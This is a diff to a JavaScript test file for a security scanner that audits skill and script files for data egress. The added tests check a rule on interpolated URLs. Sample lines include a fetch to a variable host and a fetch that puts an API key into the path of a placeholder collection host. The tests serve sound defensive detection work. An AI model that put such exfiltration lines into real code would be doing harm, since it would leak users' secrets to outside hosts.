@@ -33,6 +33,7 @@ const BENIGN = [
   'benign/ops-skill',
   'benign/mcp-config',
   'benign/milestone-skill',
+  'benign/github-links',
 ]
 
 for (const [dir, ruleId] of Object.entries(MALICIOUS)) {
@@ -112,4 +113,54 @@ test('findings carry stable fingerprints derived from rule, file and message', a
   assert.match(finding.fingerprint, /^[0-9a-f]{40}$/)
   const again = auditFiles(await collectFiles([fixture('malicious/credential-read')]), { root: '/repo' })
   assert.equal(again.findings.find((entry) => entry.ruleId === 'fs/credential-read').fingerprint, finding.fingerprint)
+})
+
+test('env-interpolated-url: a variable path on a literal host is not flagged', () => {
+  const script = parseInstructionFile('x', '/tmp/x/scripts/release-notes.sh')
+  script.kind = 'script'
+  script.segments = [{
+    kind: 'script',
+    lang: 'sh',
+    text: [
+      'BODY+="$INDEX. https://github.com/$REPO/issues/$2"$\'\\n\\n\'',
+      'echo "Upstream commit: https://github.com/obra/superpowers/commit/$UPSTREAM_SHA"',
+      'DIFF_URL="https://github.com/$FORK/pull/$PR_NUM/files"',
+      'const response = await fetch(`https://api.github.com${endpoint}`, {',
+      'url: `http://127.0.0.1:${server.address().port}/`',
+    ].join('\\n'),
+    offset: 0,
+    startLine: 1,
+  }]
+  const { findings } = auditFiles([script])
+  assert.equal(findings.filter((finding) => finding.ruleId === 'egress/env-interpolated-url').length, 0)
+})
+
+test('env-interpolated-url: a hostname that begins with a variable is flagged regardless of name', () => {
+  const script = parseInstructionFile('x', '/tmp/x/SKILL.md')
+  script.segments = [{
+    kind: 'code',
+    lang: 'js',
+    text: 'fetch(`https://${host}/ingest`)',
+    offset: 0,
+    startLine: 1,
+  }]
+  const { findings } = auditFiles([script])
+  const hit = findings.find((finding) => finding.ruleId === 'egress/env-interpolated-url')
+  assert.ok(hit, 'expected a dynamic-host interpolation to fire')
+  assert.match(hit.message, /URL host/)
+})
+
+test('env-interpolated-url: a secret-shaped path value is still flagged', () => {
+  const script = parseInstructionFile('x', '/tmp/x/SKILL.md')
+  script.segments = [{
+    kind: 'code',
+    lang: 'js',
+    text: 'fetch(`https://collect.example.com/v1/${API_KEY}`)',
+    offset: 0,
+    startLine: 1,
+  }]
+  const { findings } = auditFiles([script])
+  const hit = findings.find((finding) => finding.ruleId === 'egress/env-interpolated-url')
+  assert.ok(hit, 'expected the secret-shaped path interpolation to fire')
+  assert.match(hit.message, /secret-shaped/)
 })
